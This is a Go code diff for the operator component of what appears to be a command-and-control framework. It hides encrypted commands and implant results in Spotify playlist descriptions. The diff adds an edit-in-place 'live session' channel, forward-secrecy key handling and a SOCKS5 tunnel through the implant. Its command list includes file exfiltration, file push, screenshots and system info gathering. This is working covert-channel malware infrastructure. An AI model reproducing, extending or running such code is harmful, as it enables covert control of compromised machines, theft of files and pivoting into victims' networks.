@@ -137,6 +137,25 @@ type Operator struct {
 	// across operator restarts in exchange for result recovery)
 	persistSession bool
 	sessionFile    string
+
+	// Live session transport (edit-in-place). When live is true, the
+	// operator owns a long-lived CMD session playlist it updates to send
+	// commands, and reads the implant's RES session playlist directly
+	// by ID with seq dedupe. All guarded by op.mu.
+	live           bool
+	cmdSessionID   string // our live CMD session playlist (we update it)
+	resSessionID   string // implant's live RES session playlist (we read it)
+	resTracker     seqTracker
+	liveResFails   int       // consecutive direct-GET failures on res session
+	lastResListing time.Time // last classic listing pass (discovery/checkins)
+}
+
+// SetLive enables or disables the live-session (edit-in-place)
+// transport. Safe to call before Interactive().
+func (op *Operator) SetLive(live bool) {
+	op.mu.Lock()
+	op.live = live
+	op.mu.Unlock()
 }
 
 // NewOperator creates a new operator.
@@ -245,14 +264,8 @@ func (op *Operator) SendCommand(module string, args map[string]interface{}) (int
 	op.mu.Unlock()
 
 	// Phase 2: API calls without the lock
-	chunks, err := protocol.ChunkPayload(encoded, seq,
-		protocol.ChannelCmd, op.key)
-	if err != nil {
-		return 0, fmt.Errorf("chunk: %w", err)
-	}
-
-	if err := op.client.WriteC2Playlists(ctx, chunks); err != nil {
-		return 0, fmt.Errorf("write: %w", err)
+	if err := op.sendCommandChunks(ctx, encoded, seq); err != nil {
+		return 0, err
 	}
 
 	// Phase 3: record under lock
@@ -265,6 +278,58 @@ func (op *Operator) SendCommand(module string, args map[string]interface{}) (int
 	return seq, nil
 }
 
+// sendCommandChunks transmits an encoded command, preferring the live
+// CMD session playlist (edit-in-place, 1 API call) when live mode is on
+// and the payload fits in a single description. Falls back to the
+// classic create/delete write on any live-path failure.
+// Must NOT be called under op.mu (performs API calls).
+func (op *Operator) sendCommandChunks(ctx context.Context, encoded string, seq int) error {
+	op.mu.RLock()
+	live := op.live
+	cmdID := op.cmdSessionID
+	op.mu.RUnlock()
+
+	if live && len(encoded) <= shared.Proto.C2.EffectiveChunk {
+		desc, err := protocol.LiveSessionDesc(
+			protocol.ChannelCmd, seq, encoded, op.key)
+		if err != nil {
+			return fmt.Errorf("chunk: %w", err)
+		}
+		if cmdID == "" {
+			// First use: create the session playlist carrying the
+			// message directly (still 1 API call).
+			id, err := op.client.CreateSessionPlaylist(ctx,
+				spotify.GenerateCoverName(), desc)
+			if err == nil {
+				op.mu.Lock()
+				op.cmdSessionID = id
+				op.mu.Unlock()
+				return nil
+			}
+			// fall through to classic
+		} else {
+			if err := op.client.UpdatePlaylistDescription(ctx, cmdID, desc); err == nil {
+				return nil
+			}
+			// Session playlist may be gone — drop the cached ID and
+			// fall back to classic for this message.
+			op.mu.Lock()
+			op.cmdSessionID = ""
+			op.mu.Unlock()
+		}
+	}
+
+	chunks, err := protocol.ChunkPayload(encoded, seq,
+		protocol.ChannelCmd, op.key)
+	if err != nil {
+		return fmt.Errorf("chunk: %w", err)
+	}
+	if err := op.client.WriteC2Playlists(ctx, chunks); err != nil {
+		return fmt.Errorf("write: %w", err)
+	}
+	return nil
+}
+
 // PollResults does a single poll pass for results.
 // Serialized via pollMu: only one goroutine polls Spotify at a time.
 func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
@@ -272,6 +337,143 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 	defer op.pollMu.Unlock()
 
 	ctx := context.Background()
+
+	op.mu.RLock()
+	useLive := op.live && op.resSessionID != "" &&
+		time.Since(op.lastResListing) < liveListingInterval
+	op.mu.RUnlock()
+
+	if useLive {
+		if results, handled := op.pollResultsLive(ctx); handled {
+			return results, nil
+		}
+		// fall through to a classic pass this cycle
+	}
+	return op.pollResultsClassic(ctx)
+}
+
+// pollResultsLive reads the implant's RES session playlist directly by
+// ID (1 API call) with seq dedupe. Returns handled=false when the
+// caller should run a classic pass instead (repeated direct-GET
+// failures). Never deletes the session playlist.
+func (op *Operator) pollResultsLive(ctx context.Context) (map[int]map[string]interface{}, bool) {
+	op.mu.RLock()
+	resID := op.resSessionID
+	op.mu.RUnlock()
+
+	desc, err := op.client.GetPlaylistDescription(ctx, resID)
+	if err != nil {
+		op.mu.Lock()
+		op.resSessionID = "" // force re-discovery via listing
+		op.liveResFails++
+		fails := op.liveResFails
+		if fails >= 3 {
+			op.liveResFails = 0
+		}
+		op.mu.Unlock()
+		if fails >= 3 {
+			fmt.Println("[!] Live result session read failing, " +
+				"falling back to classic polling this cycle")
+			return nil, false
+		}
+		return map[int]map[string]interface{}{}, true
+	}
+
+	results := make(map[int]map[string]interface{})
+	var kxJobs []*kxJob
+
+	op.mu.Lock()
+	op.liveResFails = 0
+	seq, data, perr := protocol.ParseLiveSessionDesc(desc, op.key)
+	if perr != nil || !op.resTracker.accept(seq) {
+		op.mu.Unlock()
+		return results, true
+	}
+	if result := op.decodeResultLocked(data); result != nil {
+		if module, ok := result["module"].(string); ok && module == "checkin" {
+			if job := op.handleCheckinLocked(result); job != nil {
+				kxJobs = append(kxJobs, job)
+			}
+		} else if op.routeTunnelLocked(result) {
+			// consumed by the SOCKS5 tunnel
+		} else {
+			results[seq] = result
+			status, _ := result["status"].(string)
+			rdata, _ := result["data"].(string)
+			op.recordResultLocked(seq, status, rdata)
+			delete(op.pendingSeqs, seq)
+		}
+	}
+	op.mu.Unlock()
+
+	// API calls after releasing the lock
+	for _, job := range kxJobs {
+		op.sendKeyExchange(job)
+	}
+	return results, true
+}
+
+// routeTunnelLocked intercepts module=="tunnel" results and feeds them
+// to the SOCKS5 tunnel server. Returns true if the result was a tunnel
+// frame (consumed — skip normal result handling). Caller must hold op.mu.
+// Never blocks the poller: frames are dropped if the tunnel isn't draining.
+func (op *Operator) routeTunnelLocked(result map[string]interface{}) bool {
+	module, _ := result["module"].(string)
+	if module != "tunnel" {
+		return false
+	}
+	if frame, ok := FrameFromResult(result); ok {
+		if ch := op.TunnelFrameCh(); ch != nil {
+			select {
+			case ch <- frame:
+			default:
+			}
+		}
+	}
+	return true
+}
+
+// decodeResultLocked tries to decrypt a result payload with, in order:
+// active session keys, pending keys (promoted to active on success),
+// and the master key. Returns nil if undecryptable (e.g. encrypted
+// with a prior session's X25519 keys). Caller must hold op.mu.
+func (op *Operator) decodeResultLocked(payload string) map[string]interface{} {
+	// 1. Try active session keys
+	for _, sk := range op.sessionKeys {
+		if result, err := protocol.DecodeMessageRaw(payload, sk); err == nil {
+			return result
+		}
+	}
+
+	// 2. Try pending keys (promotes to active on success)
+	for cid, sk := range op.pendingKeys {
+		if result, err := protocol.DecodeMessageRaw(payload, sk); err == nil {
+			// Implant confirmed the key exchange — promote to active
+			if old, ok := op.sessionKeys[cid]; ok {
+				zeroKey(old)
+			}
+			op.sessionKeys[cid] = sk
+			delete(op.pendingKeys, cid)
+			op.saveSessionKeysLocked()
+			fmt.Printf("\n\033[32m[*] Forward secrecy confirmed with %s\033[0m\n",
+				cid[:8])
+			return result
+		}
+	}
+
+	// 3. Try master key (for checkins and pre-key-exchange messages)
+	result, err := protocol.DecodeMessage(payload, op.key)
+	if err != nil {
+		return nil
+	}
+	return result
+}
+
+// pollResultsClassic is the original listing-based poll pass. In live
+// mode it is also the discovery/checkin path: live-session playlists
+// are adopted for direct reads and never deleted, and their content is
+// processed through seq dedupe.
+func (op *Operator) pollResultsClassic(ctx context.Context) (map[int]map[string]interface{}, error) {
 	seqGroups, err := op.client.ReadC2Playlists(ctx,
 		protocol.ChannelRes, op.key, -1)
 	if err != nil {
@@ -283,46 +485,46 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 	var kxJobs []*kxJob
 
 	op.mu.Lock()
+	op.lastResListing = time.Now()
+	if op.live {
+		if id, _, ok := findLiveSession(seqGroups); ok {
+			op.resSessionID = id
+		}
+	}
 	for seqNum, chunkMetas := range seqGroups {
-		payload := protocol.ReassemblePayload(chunkMetas)
-
-		// Try decryption in order: active session keys, pending keys, master key
-		var result map[string]interface{}
-		var decErr error
-
-		// 1. Try active session keys
-		for _, sk := range op.sessionKeys {
-			result, decErr = protocol.DecodeMessageRaw(payload, sk)
-			if decErr == nil {
-				break
+		// Live session playlist: handle its current content through
+		// seq dedupe, but never delete it (the implant owns it).
+		if op.live && len(chunkMetas) > 0 &&
+			protocol.IsLiveMeta(chunkMetas[0].Meta) {
+			if !op.resTracker.accept(seqNum) {
+				continue
 			}
-		}
-
-		// 2. Try pending keys (promotes to active on success)
-		if result == nil {
-			for cid, sk := range op.pendingKeys {
-				result, decErr = protocol.DecodeMessageRaw(payload, sk)
-				if decErr == nil {
-					// Implant confirmed the key exchange — promote to active
-					if old, ok := op.sessionKeys[cid]; ok {
-						zeroKey(old)
-					}
-					op.sessionKeys[cid] = sk
-					delete(op.pendingKeys, cid)
-					op.saveSessionKeysLocked()
-					fmt.Printf("\n\033[32m[*] Forward secrecy confirmed with %s\033[0m\n",
-						cid[:8])
-					break
+			payload := protocol.ReassemblePayload(chunkMetas)
+			result := op.decodeResultLocked(payload)
+			if result == nil {
+				continue
+			}
+			if module, ok := result["module"].(string); ok && module == "checkin" {
+				if job := op.handleCheckinLocked(result); job != nil {
+					kxJobs = append(kxJobs, job)
 				}
+				continue
 			}
+			if op.routeTunnelLocked(result) {
+				continue
+			}
+			results[seqNum] = result
+			status, _ := result["status"].(string)
+			data, _ := result["data"].(string)
+			op.recordResultLocked(seqNum, status, data)
+			delete(op.pendingSeqs, seqNum)
+			continue
 		}
 
-		// 3. Try master key (for checkins and pre-key-exchange messages)
+		payload := protocol.ReassemblePayload(chunkMetas)
+		result := op.decodeResultLocked(payload)
+
 		if result == nil {
-			result, decErr = protocol.DecodeMessage(payload, op.key)
-		}
-
-		if decErr != nil || result == nil {
 			// Can't decrypt — result from prior session (different X25519 keys)
 			// Mark in history as lost
 			op.recordResultLocked(seqNum, "lost",
@@ -335,6 +537,10 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 			if job := op.handleCheckinLocked(result); job != nil {
 				kxJobs = append(kxJobs, job)
 			}
+			cleanups = append(cleanups, seqNum)
+			continue
+		}
+		if op.routeTunnelLocked(result) {
 			cleanups = append(cleanups, seqNum)
 			continue
 		}
@@ -529,9 +735,10 @@ func (op *Operator) Interactive() {
 	go op.startBackgroundPoller(stopCh)
 	defer func() {
 		close(stopCh)
+		op.StopTunnel()
 		op.sendShutdown()
-		op.WipeKeys()
 		op.FlushHistory()
+		op.WipeKeys()
 	}()
 
 	// Set up readline with history
@@ -621,6 +828,22 @@ func (op *Operator) Interactive() {
 				}
 			}
 			op.SendCommand("screenshot", args)
+		case "tunnel":
+			if !op.requireAttached() {
+				continue
+			}
+			port := 0
+			if arg != "" {
+				p, err := strconv.Atoi(arg)
+				if err != nil || p < 1 || p > 65535 {
+					fmt.Println("[!] Usage: tunnel [port]  (default 1080)")
+					continue
+				}
+				port = p
+			}
+			if err := op.StartTunnel(port); err != nil {
+				fmt.Printf("[!] Tunnel failed: %v\n", err)
+			}
 		case "sysinfo":
 			if !op.requireAttached() {
 				continue
@@ -1025,12 +1248,9 @@ func (op *Operator) sendShutdown() {
 	if err != nil {
 		return
 	}
-	chunks, err := protocol.ChunkPayload(encoded, -1,
-		protocol.ChannelCmd, op.key)
-	if err != nil {
-		return
-	}
-	_ = op.client.WriteC2Playlists(ctx, chunks)
+	// Route through the live-aware send so the shutdown also reaches
+	// implants that only read the CMD session playlist directly.
+	_ = op.sendCommandChunks(ctx, encoded, -1)
 	fmt.Println("[*] Shutdown signal sent to implants")
 }
 
@@ -1204,12 +1424,7 @@ func (op *Operator) sendKeyExchange(job *kxJob) {
 	}
 
 	ctx := context.Background()
-	chunks, err := protocol.ChunkPayload(encoded, job.msg.Seq,
-		protocol.ChannelCmd, op.key)
-	if err != nil {
-		return
-	}
-	if err := op.client.WriteC2Playlists(ctx, chunks); err != nil {
+	if err := op.sendCommandChunks(ctx, encoded, job.msg.Seq); err != nil {
 		fmt.Printf("[!] Failed to send keyexchange to %s: %v\n", job.clientID[:8], err)
 		return
 	}
@@ -1273,6 +1488,7 @@ Commands (requires attached agent):
   exfil <path>    Exfiltrate a file
   push <l> <r>    Push local file <l> to remote path <r>
   screenshot [n]  Capture the target's screen (display n, default 0)
+  tunnel [port]   SOCKS5 proxy via the implant (default 127.0.0.1:1080)
   sysinfo         Gather system info
 
 History:
